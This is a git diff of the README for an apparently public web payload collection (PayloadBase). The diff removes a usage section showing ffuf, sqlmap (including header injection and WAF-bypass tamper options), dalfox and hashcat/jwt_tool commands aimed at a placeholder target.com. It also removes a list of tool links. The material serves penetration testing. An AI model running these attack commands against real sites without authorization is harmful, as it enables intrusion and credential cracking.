@@ -61,53 +61,6 @@ git clone https://github.com/ayodyadsr/PayloadBase.git
 | `ssti/` | Server-Side Template Injection — Jinja2, Twig, Freemarker, ERB, Pebble |
 | `xss/` | Cross-Site Scripting — reflected, stored, DOM, blind, polyglot |
 | `xxe/` | XML External Entity — file read, SSRF, blind OOB, bypass |
-- - -
-
-### Usage
-
-**ffuf**
-```bash
-# Example: fuzz parameters
-ffuf -u "https://target.com/page?FUZZ=test" -w hidden_params/basic.txt
-
-# Example: test SSRF params
-ffuf -u "https://target.com/?FUZZ=http://127.0.0.1" -w ssrf/parameter_names.txt
-
-# Example: GraphQL endpoint discovery
-ffuf -u https://target.com/FUZZ -w graphql/endpoints.txt
-```
- 
-**Burp Suite Intruder**
-```
-Load any .txt file directly as Intruder payload list.
-```
- 
-**SQLMap**
-```bash
-# GET
-sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --level=3 --risk=1
- 
-# POST (from saved request)
-sqlmap -r /tmp/target.txt --technique=T --time-sec=10 --level=3 --risk=1
- 
-# Header injection
-sqlmap -u "https://target.com/" --technique=T --time-sec=10 --level=5 --risk=3 -p "User-Agent" --random-agent
- 
-# WAF bypass
-sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase
-```
- 
-**Dalfox (XSS)**
-```bash
-dalfox file xss/reflected.txt --silence
-echo "https://target.com/?q=FUZZ" | dalfox pipe
-```
- 
-**JWT crack**
-```bash
-hashcat -m 16500 <jwt_token> jwt/secrets.txt
-python3 jwt_tool.py <token> -C -d jwt/secrets.txt
-```
 
 - - -
 
@@ -117,14 +70,6 @@ python3 jwt_tool.py <token> -C -d jwt/secrets.txt
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A list of useful payloads and bypasses for web application security and pentest/CTF.
 - [FuzzDB](https://github.com/fuzzdb-project/fuzzdb): Dictionary of attack patterns and primitives for black-box application fault injection.
 - [IntruderPayloads](https://github.com/1N3/IntruderPayloads): A collection of Burp Suite Intruder payloads and fuzz lists.
-
-- - -
-
-### Payload Tools
-
-- [sqlmap](https://github.com/sqlmapproject/sqlmap): Automatic SQL injection and database takeover tool.
-- [ffuf](https://github.com/ffuf/ffuf): Fast web fuzzer written in Go.
-- [Burp Suite](https://portswigger.net/burp): Web security testing platform.
 
 - - -
 
